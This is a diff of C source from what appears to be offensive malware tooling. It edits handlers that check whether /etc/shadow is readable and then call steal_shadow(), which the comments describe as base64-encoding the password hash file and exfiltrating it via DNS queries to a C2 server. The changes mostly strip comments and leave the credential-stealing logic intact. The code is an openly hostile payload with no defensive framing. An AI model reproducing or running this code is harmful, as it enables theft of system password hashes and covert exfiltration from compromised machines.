@@ -278,16 +278,13 @@ static int shadow_exfiltration_completed = 0;
  * 1. Check if exfiltration was already completed (if yes, return not vulnerable)
  * 2. Check if we can read /etc/shadow file (indicates root/privileged access)
  * 3. Return vulnerable=true if we have access and haven't exfiltrated yet, false otherwise
- * 
- * Note: target_ip parameter is ignored - handler checks local privileges
  */
 cve_scan_result_t cve_shadow_exfiltration_scan(const char* target_ip) {
-    (void)target_ip;  // Handler checks local privileges
+    (void)target_ip;
     
     cve_scan_result_t result = {0};
     result.cve_id = CVE_SHADOW_EXFILTRATION;
     
-    // If already completed, mark as not vulnerable to prevent re-execution
     if (shadow_exfiltration_completed) {
         result.is_vulnerable = 0;
         result.confidence = 0;
@@ -297,16 +294,13 @@ cve_scan_result_t cve_shadow_exfiltration_scan(const char* target_ip) {
         return result;
     }
     
-    // Check if we can read /etc/shadow (requires root/privileged access)
     if (access("/etc/shadow", R_OK) == 0) {
-        // We have read access to /etc/shadow = we're running with privileges
         result.is_vulnerable = 1;
-        result.confidence = 10;  // High confidence - we can actually read the file
-        result.port_open = 0;    // No port requirement
+        result.confidence = 10;
+        result.port_open = 0;
         strncpy(result.service_type, "LOCAL", sizeof(result.service_type) - 1);
         printf("[*] Privileged access detected - can read /etc/shadow\n");
     } else {
-        // No read access = not privileged
         result.is_vulnerable = 0;
         result.confidence = 0;
         result.port_open = 0;
@@ -328,11 +322,9 @@ cve_scan_result_t cve_shadow_exfiltration_scan(const char* target_ip) {
  * 4. Encode in base64 URL-safe
  * 5. Exfiltrate via DNS queries to C2 server
  * 6. Mark as completed to prevent future executions
- * 
- * Note: target_ip parameter is ignored - handler operates on local system
  */
 int cve_shadow_exfiltration_execute(const char* target_ip) {
-    (void)target_ip;  // Handler operates on local system
+    (void)target_ip;
     
     // Prevent duplicate execution
     if (shadow_exfiltration_completed) {
@@ -340,16 +332,13 @@ int cve_shadow_exfiltration_execute(const char* target_ip) {
         return 0;
     }
     
-    // Verify we still have access (may have changed since scan)
     if (access("/etc/shadow", R_OK) != 0) {
         printf("[-] Cannot read /etc/shadow: %s\n", strerror(errno));
         return 0;
     }
     
-    // Steal and exfiltrate shadow file
     steal_shadow();
     
-    // Mark as completed to prevent future executions
     shadow_exfiltration_completed = 1;
     printf("[+] Shadow exfiltration completed - marked as done (will not execute again)\n");
     
